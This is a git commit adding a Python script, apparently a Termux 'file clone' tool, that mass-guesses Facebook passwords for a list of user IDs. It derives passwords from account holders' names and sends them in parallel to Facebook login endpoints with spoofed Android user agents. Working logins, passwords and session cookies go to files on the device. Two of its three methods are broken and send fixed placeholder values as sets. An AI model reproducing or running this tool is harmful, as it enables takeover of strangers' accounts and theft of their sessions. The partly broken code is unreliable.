3cda11252e4da8abf4e930044b7bcd6d43aa6cb4
SHANTO-KING <143583631+SHANTO-KING@users.noreply.github.com>
2023-10-25 02:47:54 +0600

    Add files via upload

---
+++ B.py
@@ -0,0 +1,562 @@
+#!/usr/bin/python
+#Original written By Parvez Ahmed
+#DANGER(Parvez Ahmed Termux) Brand
+
+#Feel DANGER POWER
+
+
+
+import os,zlib
+
+from os import system as osRUB
+from os import system as cmd
+os.system('clear')
+print('Welcome to RJ Tools...\n')
+
+
+
+try:
+    import requests 
+except ImportError:
+    print('\n  Installing Requests ...\n')
+    os.system('pip install requests')
+
+
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n  installing futures ...\n')
+    os.system('pip install futures')
+
+try:
+    import mechanize
+except ModuleNotFoundError:
+    os.system('pip install mechanize > /dev/null')
+
+from urllib.request import Request, urlopen
+import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
+from concurrent.futures import ThreadPoolExecutor as mogidDANGER
+from string import * 
+from random import randint
+from time import sleep as slp
+from os import system as cmd
+from zlib import decompress 
+import os, platform
+
+from concurrent.futures import ThreadPoolExecutor
+fast_work = ThreadPoolExecutor(max_workers=15).submit
+
+import random
+import string
+
+
+
+model2 ="""M2101K6G
+Aquaris U Plus
+SM-G780G
+SM-O497J
+SM-L427V
+SM-C297Z
+SM-G507X
+SM-Y634L
+SM-J204F
+SM-R911A
+SM-X801O
+SM-A792E
+SM-H270F
+SM-P993J
+SM-V233F
+SM-O861W
+SM-D182C
+SM-Y729G
+SM-Z367Q
+SM-U191O
+SM-U559U
+SM-B567Y
+SM-O846M
+SM-G342Z
+SM-K531M
+SM-I847H
+SM-A728M
+SM-L637H
+SM-L429N
+SM-P413J
+SM-N731T
+SM-R505B
+SM-A744X
+SM-O400L
+SM-F799H
+SM-Z679E
+SM-G822H
+SM-N489K
+SM-Z200Z
+SM-Y119O
+SM-E201F
+SM-N785T
+SM-G200V
+SM-R067J
+SM-N134B
+SM-N227J
+SM-K221P
+SM-S150D
+SM-A869J
+SM-H143V
+SM-C469H
+SM-T152I
+SM-Y575D
+SM-W880B
+SM-W460Q
+SM-Q159J
+SM-U637R
+SM-J924Q
+SM-W512P
+SM-I745B
+SM-O118H
+SM-U111M
+SM-U522B
+SM-B611V
+SM-G520J
+SM-D144B
+SM-C181B
+SM-V128Q
+SM-U167W
+SM-L098E
+SM-P454L
+SM-L943O
+SM-D368H
+SM-P485X
+SM-C715N
+SM-H010U
+SM-H710B
+SM-X633F
+SM-Z040T
+SM-Q391G
+SM-N451P
+SM-T115B
+SM-R248C
+SM-T618P
+SM-S067L
+SM-M619P
+SM-Q048A
+SM-I787D
+SM-X275W
+SM-G911F
+SM-R924W
+SM-S506Z
+SM-V941V
+SM-G016M
+SM-O008J
+SM-L296E
+SM-U876V
+SM-L600X
+SM-G169P
+SM-F578L
+SM-S727V
+SM-F213B
+SM-U822H
+SM-Q995Y
+SM-I602I
+SM-V225C
+SM-U921J
+SM-Z302E
+SM-Y080Z
+SM-X174G
+SM-T157W
+SM-M311W
+SM-H791P
+SM-Q343U
+SM-H261C
+SM-D442E
+SM-E047H
+SM-S082M
+SM-U311K
+SM-Z651V
+SM-I566H
+SM-I593C
+SM-L375P
+SM-D399D
+SM-Y086S
+SM-O365U
+SM-W782A
+SM-S236Q
+SM-D514J
+SM-W806F
+SM-W809F
+SM-M645P
+SM-W098A
+SM-O026U
+SM-Y689Z
+SM-D832N
+SM-C691X
+SM-D921H
+SM-G403Y
+SM-S210U
+SM-D768K
+SM-F912H
+SM-H856A
+SM-J184W
+SM-D512U
+SM-K786Z
+SM-Z107O
+SM-D499G
+SM-C815N
+SM-D590H
+SM-V695N
+SM-M093A
+SM-S354P
+SM-F657J
+SM-R743O
+SM-A180A
+SM-B651H
+SM-X279B
+SM-X429B
+SM-R588G
+SM-Y318K
+SM-G967W
+SM-P668C
+SM-B401K
+SM-S853U
+SM-A377K
+SM-K914A
+SM-J624R
+SM-L536Y
+SM-B190B
+SM-Q769S
+SM-Z872L
+SM-S322A
+SM-O621Y
+SM-N100L
+SM-A840S
+SM-E543H
+SM-H386M
+SM-Y932W
+SM-T496G
+SM-E768E
+SM-R031A
+SM-Q015D
+SM-P522K
+SM-D436Z
+SM-R077U
+SM-I233Z
+SM-H906Q
+SM-K838M
+SM-O369U
+SM-F458K
+SM-M382E
+SM-L337L
+SM-G904B
+SM-N351H
+SM-V670M
+SM-W266H
+SM-Q576G
+SM-G359C
+SM-R096P
+SM-F952H
+SM-Y608N
+SM-C736V""".splitlines()
+
+
+
+totaldmp = 0
+count = 0
+loop = 0
+oks = []
+cps = []
+id = []
+ps = []
+sid = []
+total=[]
+methods = []
+srange = 0
+saved = []
+totaldmp = 0
+filter = []
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+def randBuildLSB():
+    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
+    VAPP = random.randint(410000000,499999999)
+    END = '[FBAN/FB4A;FBAV/148.0.0.94.498;FBBV/346484979;FBDM/{density=3.0,width=1080,height=2376};FBLC/en_GB;FBRV/47141262;FBCR/Zong;FBMF/INFINIX;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X676C;FBSV/12;FBOP/19;FBCA/arm64-v8a:armeabi-v7a:armeabi;]'
+    ua = f'Davik/2.1.0 (Linux; U; Android 12.0.1 {random.randint(4,13)}; {random.choice(model2)} Build/SP1A.210812.016.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    return ua
+
+def randFBAN():
+  VAPP = random.randint(410000000,499999999)
+  ua="[FBAN/FB4A;FBAV/68.0.0.3593;FBBV/"+str(VAPP)+";FBDM/{density=2.5,width=780,height=1920};FBLC/fr_IN;FBRV/4214899694;FBCR/1030;FBMF/Realme;FBBD/Ostin;FBPN/com.facebook.katana;FBDV/"+random.choice(model2)+";FBSV/16;FBOP/5;FBCA/arm64-v8a:;]"
+  return ua
+
+def randBuildvsskj():
+    END = '[FBAN/FB4A; FBAV/369.0.0.35.121; FBPN/com.facebook.katana; FBLC/en_US; FBBV/337870037; FBCR/; FBFS/2.6]'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android 7.1.1{random.randint(4,13)}; {random.choice(model2)} Build/NMF26X.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    return ua
+
+sys.stdout.write('\x1b]2; DANGER\x07')
+S = '\033[1;37m'
+A = '\x1b[38;5;208m'
+R = '\x1b[38;5;46m'
+F = '\x1b[38;5;48m'
+Z = '\033[1;33m'
+head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
+logo ="""
+\033[1;33m  ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
+\033[1;32m  ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
+\033[1;36m  ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
+\033[1;33m~~~~\033[1;32mD\033[1;33mA \033[1;34mN \033[1;35mG \033[1;36mE \033[1;37mR~~~\033[1;37m[X\033[1;37mD]
+\033[1;32m--------------------------------------------------------
+\033[1;37m[\033[1;31m•\033[1;37m]\033[1;31m  DEVELOPER    :   \033[1;31mNot Found
+\033[1;37m[\033[1;32m•\033[1;37m]\033[1;32m  TOOLS        :   \033[1;32mFILE-CLONE
+\033[1;37m[\033[1;33m•\033[1;37m]\033[1;33m  VERSION      :   \033[1;33m1.0
+\033[1;37m[\033[1;34m•\033[1;37m]\033[1;34m  WORKING      :   \033[1;34mDATA/WIFI
+\033[1;37m[\033[1;35m•\033[1;37m]\033[1;35m  WHATSAPP     :   \033[1;35m013108682**
+\033[1;32m------------------------------------------------------"""
+def clear():
+    os.system("clear")
+    print(logo) 
+        
+def result(OKs,cps):
+    if len(OKs) != 0 or len(cps) != 0:
+        print('\n')
+        print("-----------------------------------------------------")
+        print(' The Process has been Complete ')
+        print(' TOTAL OK: %s' % str(len(oks)))
+        print(' TOTAL CP: %s' % str(len(cps)))
+        print("-----------------------------------------------------")
+        input("Press enter to back DANGER Menu ")
+        exit()
+
+def DANGER():   
+    os.system('clear')
+    print(logo)
+    print(f'[1] File Crack')
+    print(f'[2] Join Facebook account ')
+    print(f'[3] Join Whatsapp Group  ')
+    print('')
+    select = input('Select Menu > ')
+    if select =='1':
+        method_crack()
+    elif select =='2':
+        os.system('xdg-open https://www.facebook.com/mdmiraj.khan.60?mibextid=ZbWKwL')
+        pass
+    elif select =='3':
+        os.system('xdg-open https://chat.whatsapp.com/LTBJe0upO8SIUsMXvHVAQd')
+    else:
+        print('\n Select valid option ... ')
+        time.sleep(2)
+        DANGER(allkey)
+        
+def method_crack():
+    global methods
+    clear()
+    print(f'[1] Method {1}')
+    print(f'[2] Method {2}')
+    print(f'[3] Method {3}')
+    #print(f'[4] Method {4}')
+    print(f'[0] Back')
+    print('')
+    option = input('Select method > ')
+    if option =='1':
+        methods.append('methodA')
+        main_crack().crack(id)
+    elif option =='2':
+        methods.append('methodD')
+        main_crack().crack(id)
+    elif option =='3':
+        methods.append('methodC')
+        main_crack().crack(id)
+    #elif option =='4':
+        #methods.append('methodB')
+        #main_crack().crack(id)
+    elif option =='0':
+        mogid()
+    else:
+      print('\n Select Valid Option ...')
+      time.sleep(0.6)
+      method_crack()
+
+class main_crack():
+    def __init__(self):
+        self.id=[]
+    def crack(self,id):
+        global methods
+        clear()
+        self.file = input('Put File Name > ')
+        try:
+            self.id = open(self.file).read().splitlines()
+            self.pasw()
+        except FileNotFoundError:
+            print('Opps File Not Found ...')
+            time.sleep(2)
+            os.system('clear')
+            print(logo)
+            print('Try Again ...')
+            time.sleep(2)
+            main_crack().crack(id)
+            
+    def methodA(self, sid, name, psw):
+        try:
+            global oks,cps,loop
+            sys.stdout.write(f"\r\033[1;32m[DANGER] \033[1;33m{loop} \033[1;32m| \033[1;34mM1 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.flush()
+            fs = name.split(' ')[0]
+            try:
+                ls = name.split(' ')[1]
+            except:
+                ls = fs
+            for pw in psw:
+                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
+                with requests.Session() as session:
+                    data = {
+'lsd', 'AVoA4gnqPqo',
+'jazoest', '21009',
+'uid', '61551104974202',
+'next', 'https://mbasic.facebook.com/login/save-device/',
+'flow', 'login_no_pin',
+'pass', 'md',
+}
+                headers = {'Host', 'p.facebook.com', 'viewport-width', '980', 'sec-ch-ua', '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-mobile', '?0', 'sec-ch-ua-platform', '"Android"', 'sec-ch-prefers-color-scheme', 'light', 'dnt', '1', 'upgrade-insecure-requests', '1', 'user-agent', 'Mozilla/5.0 (Linux; U; Android 7;  TL-tl; GT-S758X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4690.149 Mobile Safari/537.36', 'accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site', 'same-origin', 'sec-fetch-mode', 'navigate', 'sec-fetch-user', '?1', 'sec-fetch-dest', 'document', 'accept-encoding', 'gzip, deflate, br', 'accept-language', 'en-GB,en;q=0.9,si-LK;q=0.8,si;q=0.7,en-US;q=0.6',}
+                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+                if 'session_key' in q:
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);DANGERb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={DANGERb};{ckkk}"
+                    print(f"\r{R} [DANGER-OK] {sid} | {ps} {S}")
+                    oks.append(sid)
+                    open('/sdcard/DANGER_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/DANGER_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    break
+                elif 'www.facebook.com' in q['error']['message']:
+                     print(f"\r{A} [DANGER-CP] {sid} | {ps} {S}")
+                     cps.append(sid)
+                     open('/sdcard/DANGER_CP.txt','a').write(sid+'|'+ps+'\n')
+                else:
+                    continue
+            loop+=1
+        except requests.exceptions.ConnectionError:
+            time.sleep(7)
+            self.methodA(sid, name, ps)
+            
+    def methodC(self, sid, name, psw):
+        try:
+            global oks,cps,loop
+            sys.stdout.write(f"\r\033[1;32m[DANGER] \033[1;33m{loop} \033[1;32m| \033[1;34mM2 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.flush()
+            fs = name.split(' ')[0]
+            try:
+                ls = name.split(' ')[1]
+            except:
+                ls = fs
+            for pw in psw:
+                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
+                with requests.Session() as session:
+                    data = {
+'lsd', 'AVoA4gnqPqo',
+'jazoest', '21009',
+'uid', '61551104974202',
+'next', 'https://mbasic.facebook.com/login/save-device/',
+'flow', 'login_no_pin',
+'pass', 'md',
+}
+                headers = {'Host', 'p.facebook.com', 'viewport-width', '980', 'sec-ch-ua', '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-mobile', '?0', 'sec-ch-ua-platform', '"Android"', 'sec-ch-prefers-color-scheme', 'light', 'dnt', '1', 'upgrade-insecure-requests', '1', 'user-agent', 'Mozilla/5.0 (Linux; U; Android 7;  TL-tl; GT-S758X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4690.149 Mobile Safari/537.36', 'accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site', 'same-origin', 'sec-fetch-mode', 'navigate', 'sec-fetch-user', '?1', 'sec-fetch-dest', 'document', 'accept-encoding', 'gzip, deflate, br', 'accept-language', 'en-GB,en;q=0.9,si-LK;q=0.8,si;q=0.7,en-US;q=0.6',}
+                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+                if 'session_key' in q:
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);DANGERb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={DANGERb};{ckkk}"
+                    print(f"\r{R} [DANGER-OK] {sid} | {ps} {S}")
+                    oks.append(sid)
+                    open('/sdcard/DANGER_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/DANGER_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    break
+                elif 'www.facebook.com' in q['error']['message']:
+                    print(f"\r{A} [DANGER-CP] {sid} | {ps} {S}")
+                    cps.append(sid)
+                    open('/sdcard/DANGER_CP.txt','a').write(sid+'|'+ps+'\n')
+                else:
+                    continue
+            loop+=1
+        except requests.exceptions.ConnectionError:
+            time.sleep(7)
+            self.methodC(sid, name, ps)
+           
+    def methodD(self, sid, name, psw):
+        global oks,cps,loop
+        sys.stdout.write(f"\r\033[1;32m[DANGER] \033[1;33m{loop} \033[1;32m| \033[1;34mM3 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+        sys.stdout.flush()
+        fs = name.split(' ')[0]
+        try:
+            ls = name.split(' ')[1]
+        except:
+            ls = fs
+        try:
+            for pw in psw:
+                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
+                session=requests.Session()
+                sua = randBuildLSB()
+                getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
+                session.headers = {}
+                session.headers.update({'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="116", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.80.89;]', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
+                complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
+                if 'c_user' in session.cookies.get_dict():
+                    print(f"\r{R} [DANGER-OK] {sid} | {ps} {S}")
+                    oks.append(sid)
+                    open('/sdcard/DANGER_OK.txt','a').write(sid+'|'+ps+'\n')
+                    break
+                elif 'checkpoint' in session.cookies.get_dict():
+                    print(f"\r{A} [DANGER-CP] {sid} | {ps} {S}")
+                    cps.append(sid)
+                    open('/sdcard/DANGER_CP.txt','a').write(sid+'|'+ps+'\n')
+                    break
+                else:
+                    continue
+                #time.sleep(31)
+            
+            loop+=1
+        except Exception as err:print(err)
+        except requests.exceptions.ConnectionError:
+             self.methodD(sid, name, ps)
+            
+    def pasw(self):       
+            pw = []
+            clear()
+            print('Put limit Unlimited')
+            sl = int(input('Password Limit→'))
+            os.system("clear")
+            print(logo)
+            print(f'\033[1;32m[Example: first123,57273200,57575751,59039200,last,name,ETC]')
+            print('')
+            if sl =='':
+                print('\n Put limit between Unlimited')
+            elif sl > 20:
+                print('\nPassword are no Limit')
+            else:
+                for sr in range(sl):
+                    pw.append(input(f'Password {sr+1} > '))
+            os.system("clear")
+            print(logo)
+            
+            print(f"{A}Use flight mode before use {S}")
+            print("\033[1;32m-----------------------------------------------------")
+            print(f'\033[1;34mCount Ids >> %s ' % len(self.id))
+            print('\033[1;35mCracking Started >>')
+            print("-----------------------------------------------------")
+            with mogidDANGER(max_workers=30) as DANGERworld:
+                for zsb in self.id:
+                   try:
+                       uid, name = zsb.split('|')
+                       sz = name.split(' ')
+                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
+                           pwx =  pw
+                       else:
+                            pwx =  pw
+                            if 'methodA' in methods:
+                                DANGERworld.submit(self.methodA, uid, name, pwx)
+                            elif 'methodB' in methods:
+                                DANGERworld.submit(self.methodB, uid, name, pwx)
+                            elif 'methodC' in methods:
+                                DANGERworld.submit(self.methodC, uid, name, pwx)
+                            elif 'methodD' in methods:
+                                DANGERworld.submit(self.methodD, uid, name, pwx)
+                   except:pass
+            result(oks,cps)   
+            
+
+
+DANGER()
